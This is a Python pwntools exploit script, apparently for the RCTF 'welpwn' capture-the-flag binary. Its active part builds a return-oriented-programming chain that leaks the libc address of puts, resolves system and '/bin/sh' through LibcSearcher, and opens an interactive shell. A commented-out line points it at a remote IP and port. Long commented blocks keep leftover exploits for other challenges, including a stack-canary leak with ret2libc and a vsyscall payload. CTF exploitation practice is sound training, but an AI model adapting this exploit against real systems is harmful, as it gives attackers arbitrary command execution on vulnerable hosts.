
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./welpwn')
io = process("./welpwn")
# gdb.attach(io)
# io = remote('111.200.241.244',60651)
ret_addr = 0x00000000004007CD
pop4 = 0x000000000040089c
pop_rdi = 0x00000000004008a3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
io.recvuntil('Welcome to RCTF\n')
payload = 'A' * 0x10 + 'B' * 0x8 + p64(pop4) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)+ p64(ret_addr)
io.sendline(payload)
pause()
io.recvuntil('BBBBBBBB')
io.recv(3)
puts_addr = u64(io.recv(6).ljust(8,'\x00'))
print('puts_addr:',hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
print('libc_base:',hex(libc_base))
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'A' * 0x10 + 'B' * 0x8 + p64(pop4) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)+ p64(ret_addr)
io.sendline(payload)
# sys_addr = libc.symbols['system']
# execv_gadget = 0x4526a
# offset_addr = execv_gadget - sys_addr
# io.sendlineafter('Choice:\n', '2')
# io.sendlineafter('Choice:\n', '1')
# io.sendlineafter('How many levels?\n', '0')
# io.sendafter('Any more?\n',str(offset_addr))
# # io.recvuntil('Answer:')
#
# vsyscall = 0xffffffffff600000
#
# for i in range(0, 99):
#     io.recvuntil('Question: ')
#     a = int(io.recvuntil(' '))
#     io.recvuntil('* ')
#     b = int(io.recvuntil(' '))
#     io.sendlineafter('Answer:', str(a * b))
#
# payload = 'a' * 0x38 + p64(vsyscall) * 3
#
# io.sendafter('Answer:', payload)


# info = io.recvline()
# log.info("info => %s", info)
#
# io.sendlineafter('--------\n>> ', '2')
# info = io.recvline()
# log.info("info => %s", info)
# canary = u64(io.recvn(7).rjust(8, '\x00'))
# # log.info("canary => %#x", canary)
# # canary = u64(io.recvn(7).rjust(8,'\x00'))
# print('canary:',hex(canary))
# pause()
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(readgot) + p64(putsplt) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')
# read_addr = u64(io.recv(6).ljust(8,'\x00'))
# print('read_addr :',hex(read_addr))
# libc = LibcSearcher('read', read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')
# log.info("system_addr => %#x", system_addr)
# log.info("binsh_addr => %#x", binsh_addr)
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')


io.interactive()
